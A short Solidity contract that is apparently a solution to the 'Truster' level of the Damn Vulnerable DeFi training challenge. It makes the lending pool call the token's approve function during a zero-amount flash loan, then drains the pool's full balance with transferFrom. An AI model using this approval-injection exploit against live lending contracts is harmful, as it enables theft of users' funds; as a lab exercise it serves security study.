// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract TrusterRequester {
    
    function getTokens(TrusterLenderPool pool) external {

        DamnValuableToken token = DamnValuableToken(pool.token());
        uint balance = token.balanceOf(address(pool));

        bytes memory approveCall = abi.encodeWithSignature("approve(address,uint256)", address(this), balance);

        pool.flashLoan(0, msg.sender, address(token), approveCall);
        token.transferFrom(address(pool), msg.sender, balance);
    }

}